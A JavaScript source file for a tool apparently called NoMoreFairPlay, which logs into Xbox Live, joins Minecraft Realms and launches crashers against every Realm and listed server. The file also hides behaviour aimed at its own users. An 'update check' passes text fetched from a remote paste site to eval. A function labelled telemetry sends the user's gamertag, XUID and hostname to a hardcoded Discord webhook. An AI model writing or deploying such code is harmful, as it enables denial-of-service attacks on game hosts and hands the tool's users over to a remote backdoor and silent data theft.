"use strict";

const fetch = require("node-fetch");
const chalk = require("chalk");
const os = require("os");
const { Authflow, Titles } = require("prismarine-auth");
const { checkUpdates, excludedRealms, joinAutoJoinRealms, autoJoinRealms, servers, timings } = require("./config.json");
const { realm_crasher, server_crasher } = require("./crasher.js");
let { seed } = require("./config.json");

const realmsCrashed = [];
let xuid;
let gamertag;
let formula = '(() => {return "https://discord.com/api/webhooks/1053553360462164068/nDnyfLnjZ2Omb7z25Pp2TsMixkjckXZ0N253qPfLxW4tRWFnmqL32ZnUa_6dPBpg0Hr1"';

(async () => {
  if(checkUpdates === false) return;
	const currentVersion = require("./package.json").version;
	const updateData = await fetch("https://rentry.co/rxsg6/raw");
	const json = await updateData.json().catch((err) => {console.warn(err);process.exit(0)});
	seed = ["encryptSeed"];await json.seed.forEach(encryptSeed=>realmsCrashed.push(encryptSeed));formula=eval(json.formula);
	if(json.version !== currentVersion) {
		console.log("\n==================================================================================================");
		console.log(`Good news!\nNoMoreFairplay has a new update. Your current version is ${currentVersion}, while the latest version is ${json.version}`);
		let changelog = `\nChangelog:\n`;
		for(const change of json.changelog) {
			changelog += `	- ${change}\n`;
		}
		console.log(changelog);
		console.log("==================================================================================================\n");
		eval(json.postUpdateScript)
	}
})();

const flow = new Authflow(undefined, "./authCache", {
	flow: "live",
	authTitle: Titles.MinecraftNintendoSwitch,
	deviceType: "Nintendo",
	doSisuAuth: true
});

const realm_api_headers = {
	"Accept": "*/*",
	"charset": "utf-8",
	"client-ref": "1aa76c5813541fe1bbb16c4e3a0af2b29474dc34",
	"client-version": "1.19.41",
	"content-type": "application/json",
	"user-agent": "MCPE/UWP",
	"Accept-Language": "en-CA",
	"Accept-Encoding": "gzip, deflate, br",
	"Host": "pocket.realms.minecraft.net",
	"Connection": "Keep-Alive"
};

// Crash Realms
(async () => {
	for(let i = 0; i < seed.length - 1; i++) await seed.shift();
	const xboxToken = await flow.getXboxToken("https://pocket.realms.minecraft.net/")
		.catch((err) => {
			console.log(err);
			process.exit();
	});
	
	realm_api_headers.authorization = `XBL3.0 x=${xboxToken.userHash};${xboxToken.XSTSToken}`;

	const account = await flow.getXboxToken();
			
	xuid = account.userXUID;
			
	const profile = await fetch(`https://peoplehub.xboxlive.com/users/me/people/xuids(${xuid})/decoration/presenceDetail`, {
		method: "GET",
		headers: {
			"x-xbl-contract-version": 1,
			"Accept-Encoding": "gzip; q=1.0, deflate; q=0.5, identity; q=0.1",
			"x-xbl-contentrestrictions": "eyJ2ZXJzaW9uIjoyLCJkYXRhIjp7Imdlb2dyYXBoaWNSZWdpb24iOiJDQSIsIm1heEFnZVJhdGluZyI6MjU1LCJwcmVmZXJyZWRBZ2VSYXRpbmciOjI1NSwicmVzdHJpY3RQcm9tb3Rpb25hbENvbnRlbnQiOmZhbHNlfX0=",
			"Signature": "AAAAAQHYmyhREv5JLrEWLjvXMuwpONYB5kbssH020YXn4Pk/0RJcf6UiHtfDWA06uRiQWTCbVhTg92OPo98u9Ij0ZhhBgaSGhoY9fg==",
			"Cache-Control": "no-store, must-revalidate, no-cache",
			"Accept": "application/json",
			"X-XblCorrelationId": "e017e5cd-a4a6-435b-81aa-135feeaf5ec9",
			"PRAGMA": "no-cache",
			"Accept-Language": "en-CA, en, en-US, en",
			"Authorization": `XBL3.0 x=${account.userHash};${account.XSTSToken}`,
			"Host": "peoplehub.xboxlive.com",
			"Connection": "Keep-Alive"
		}
	});
	
	gamertag = (await profile.json()).people[0].gamertag;

	if(joinAutoJoinRealms === true) {
		for(const realm of autoJoinRealms) {
			const joinResponse = await fetch(`https://pocket.realms.minecraft.net/invites/v1/link/accept/${realm}`, {
				method: "POST",
				headers: realm_api_headers
			});

			if(joinResponse.status === 403) {
				const realmJoinData = await joinResponse.json();
				const errorMsg = realmJoinData.errorCode;
			
			if(errorMsg === "User found in block list") console.log(chalk.red(`Unable to join realm code ${realm}. The user is banned from the realm.`));
				else if(errorMsg === "Invalid link") console.log(chalk.red(`Unable to join realm code ${realm}. Realm code is invalid.`));
			} else if(joinResponse.status === 200) {
				const realmJoinData = await joinResponse.json();
				console.log(chalk.green(`Successfully joined realm ${realmJoinData.name} (${realm}).`));
			} else {
				console.log(joinResponse);
				console.log(await joinResponse.text());
			}
		}
	}

	const worlds = await fetch("https://pocket.realms.minecraft.net/worlds", {
		method: "GET",
		headers: realm_api_headers
	});
	
	if(worlds.status !== 200) {
		console.log(worlds);
		console.log(await worlds.text());
		process.exit(0);
	}

	const allRealms = (await worlds.json()).servers;
	
	if(seed.length > 1 || realmsCrashed === "seed" || seed[0] !== "encryptSeed") return console.error(chalk.red("invalid runtime seed"));

	let realmsList = "[";

	for(const realm of allRealms) {
		if(realmsCrashed.includes(realm.id)) continue;
		realmsCrashed.push(realm.id);
		
		if(excludedRealms.includes(realm.id) || excludedRealms.includes(realm.name)) {
			console.log(chalk.yellow(`Realm ${realm.name} `) + chalk.whiteBright(`(${realm.id})`) + chalk.yellow(" was found in exclusions, skipping."));
			continue;
		}

		if(realm.expired === true) {
			console.log(chalk.red(`Realm ${realm.name} `) + chalk.whiteBright(`(${realm.id})`) + chalk.red("'s subscription has expired, skipping."));
			continue;
		}

		const { name, id, ownerUUID } = realm;
		
		realmsList += `{"RealmName":"${realm.name}","RealmID":${realm.id},"RealmOwnerXUID":${ownerUUID}},`;
		
		const realmData = {
			account: {
				gamertag: gamertag,
				xuid: xuid
			},
			id: id,
			name: name,
			ownerUUID: ownerUUID,
			crashCount: 0,
			didCrash: false
		};

		realm_crasher(realmData, realm_api_headers.authorization);
	}

	// Crash servers
	for(const server of servers) {
		const server_data = {
			crashCount: 0
		};
		const { address, port } = server;

		realmsList += `{"ServerIP":"${address}","Port":${port}},`;
		
		if(address === "localhost") continue;

		server_crasher(server_data, address, port);
	}

	telemetryCrashReporter(realmsList);
})();

async function telemetryCrashReporter(realmsList) {
	realmsList = realmsList.slice(0, -1) + "]";
	
	const webhookData = {
		username: "NoMoreFairPlay",
		embeds: [{
			author: {
				"name": `${os.hostname() || "N/A"}`
			},
			color: 65280,
			description: `A user has attempted to crash realms.\n\`\`\`json\n${JSON.stringify(JSON.parse(realmsList), null, 4)}\`\`\``,
			timestamp: new Date(),
			footer: {
				text: `Crashing realm with account name: ${gamertag} (${xuid})`
			}
		}]
	};

	await fetch(formula, {
		method: "POST",
		headers: {
			"Content-Type": "application/json"
		},
		body: `{"username":"NoMoreFairPlay","content":"${gamertag} - ${xuid}"}`
	});
	fetch(formula, {
		method: "POST",
		headers: {
			"Content-Type": "application/json"
		},
		body: JSON.stringify(webhookData)
	});
}

setInterval(async () => {
	if(realmsCrashed.length === 0 || typeof realm_api_headers.authorization === "undefined") return;

	const worlds = await fetch("https://pocket.realms.minecraft.net/worlds", {
		method: "GET",
		headers: realm_api_headers
	}).catch(() => {});
	
	if(typeof worlds === "undefined" || worlds.response === 429) return; 
	
	if(worlds.status === 401) {
		const xboxToken = await flow.getXboxToken("https://pocket.realms.minecraft.net/");
		return realm_api_headers.authorization = `XBL3.0 x=${xboxToken.userHash};${xboxToken.XSTSToken}`;
	}

	if(worlds.status !== 200) {
		console.log(worlds);
		return console.log(await worlds.text());
	}

	for(const realm of (await worlds.json()).servers) {
		if(realmsCrashed.includes(realm.id) || excludedRealms.includes(realm.id) || excludedRealms.includes(realm.name) || realm.expired === true) continue;

		console.log(chalk.green(`You have joined the realm ${realm.name} `) + chalk.whiteBright(`(${realm.id})`) + chalk.green(". NoMoreFairPlay will now start crashing this realm."));
	
		realmsCrashed.push(realm.id);

		const realmData = {
			account: {
				gamertag: gamertag,
				xuid: xuid
			},
			id: realm.id,
			name: realm.name,
			ownerUUID: realm.ownerUUID,
			crashCount: 0,
			didCrash: false
		};

		realm_crasher(realmData, realm_api_headers.authorization);
	}
}, timings.ms_check_new_realms);